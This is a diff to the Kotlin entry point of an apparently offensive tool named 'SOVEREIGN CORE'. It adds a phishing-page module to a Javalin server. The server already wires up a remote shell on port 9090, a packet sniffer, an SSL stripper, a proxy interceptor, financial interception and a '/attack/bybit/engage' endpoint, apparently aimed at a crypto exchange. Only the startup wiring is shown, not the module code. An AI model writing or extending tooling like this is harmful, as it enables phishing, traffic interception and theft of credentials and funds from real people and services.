@@ -1,3 +1,4 @@
+cat << 'EOF' > src/main/kotlin/com/fardc/sigint/core/Main.kt
 package com.fardc.sigint.core
 
 import io.javalin.Javalin
@@ -6,14 +7,10 @@ import java.time.Instant
 fun main(args: Array<String>) {
     println("✅ SOVEREIGN CORE v2.1 boot OK @ ${Instant.now()}")
 
-    // 1. Initialisation des Sentinelles
     val gatekeeper = Gatekeeper()
     val killSwitch = KillSwitch()
-
-    // 2. Configuration du port
     val port = args.firstOrNull()?.toIntOrNull() ?: 7070
 
-    // 3. Instanciation des unités (Synchronisées avec tes fichiers modules)
     val rotator = EncryptionKeyRotator()
     val vault = SecurityVault() 
     val interceptor = FinCapInterception()
@@ -25,22 +22,21 @@ fun main(args: Array<String>) {
     val trafficMirror = TrafficMirror()
     val sslStripper = SSLStripper()
     val proxyCapture = ProxyInterceptor(vault)
+    val phish = PhishCommander(vault)
 
-    // 🚀 ACTIVATION DES UNITÉS
     rotator.startRotation()
     interceptor.runInterceptionMode()
     resilience.monitorSystem()
     remoteShell.startShell(9090)
     packetSniffer.startSniffing(9999)
 
-    // 4. Démarrage du Serveur Javalin (Maintient le noyau en vie)
     val app = Javalin.create().start(port)
+    phish.setupPhishPage(app)
 
     println("🛡️ TUNNEL SÉCURISÉ ACTIF SUR LE PORT $port")
 
-    // 5. ENDPOINTS TACTIQUES
     app.get("/status") { ctx ->
-        ctx.json(mapOf("status" to "COMBAT_READY", "version" to "2.1-INTERCEPTOR"))
+        ctx.json(mapOf("status" to "COMBAT_READY", "version" to "2.1-PHISH"))
     }
 
     app.get("/attack/bybit/engage") { ctx ->
@@ -57,3 +53,4 @@ fun main(args: Array<String>) {
         killSwitch.engage()
     }
 }
+EOF
